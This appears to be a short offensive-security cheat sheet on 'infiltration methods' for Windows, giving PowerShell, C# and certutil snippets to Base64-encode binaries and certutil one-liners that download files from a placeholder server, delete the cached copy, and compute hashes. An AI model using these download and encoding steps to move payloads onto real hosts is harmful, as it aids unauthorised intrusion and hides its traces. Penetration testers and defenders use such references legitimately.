# Infiltration methods
## Base64 encoding / decoding
Do not forget to Base64 encode your data before infiltration especially if it is binary!...
### Powershell
- Encoding:
```
$PEBytes = [System.IO.File]::ReadAllBytes("C:\<path>\<decoded_file.ext>")
$Base64Payload = [System.Convert]::ToBase64String($PEBytes)
Set-Content <encoded_file.ext> -Value $Base64Payload
```

- Decoding:
```
$Base64Bytes = Get-Content ("<encoded_file.ext>")
$PEBytes= [System.Convert]::FromBase64String($Base64Bytes)
[System.IO.File]::WriteAllBytes("<decoded_file.ext>",$PEBytes)
```

### C#
- Encoding:
```
using System.IO;

byte[] AsBytes = File.ReadAllBytes(@"C:\<path>\<decoded_file.ext>");
String AsBase64String = Convert.ToBase64String(AsBytes);
StreamWriter sw = new StreamWriter(@"C:\<path>\<encoded_file.ext>");
sw.Write(AsBase64String);
sw.Close();
```

- Decoding:
```
using System.IO;

String AsString = File.ReadAllText(@"C:\<path>\<encoded_file.ext>");
byte[] bytes = Convert.FromBase64String(AsString);          
FileStream fs = new FileStream(@"C:\<path>\<decoded_file.ext>", FileMode.Create);
fs.Write(bytes, 0, bytes.Length);
fs.Flush();
fs.Close();
```

### certutil
- Encoding:
```
certutil.exe -encode <decoded_file.ext> <encoded_file.ext>
```

- Decoding:
```
certutil.exe -decode <encoded_file.ext> <decoded_file.ext>
```

## certutil
### Downloading
1. Current path, same filename:
```
certutil.exe -urlcache -split -f https://<server>/<file.ext>
```

2. Current path, <filename>:
```
certutil.exe -urlcache -split -f https://<server>/<file.ext> <filename>
```

3. Cache directory, random name:
- Downloading
```
certutil.exe -urlcache -f https://<server>/<file.ext>
```

- File is stored in:
```
%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
```

- Delete it manually or with:
```
certutil.exe -urlcache -f https://<server>/<file.ext> delete
```

### To check the cache ;)
Because it could be interesting!...
```
certutil.exe -urlcache *
```

### Compute file hash
- SHA-1:
```
certutil.exe -hashfile <file.ext>
```

- SHA-256:
```
certutil.exe -hashfile <file.ext> SHA256
```

- MD5:
```
certutil.exe -hashfile <file.ext> MD5
```
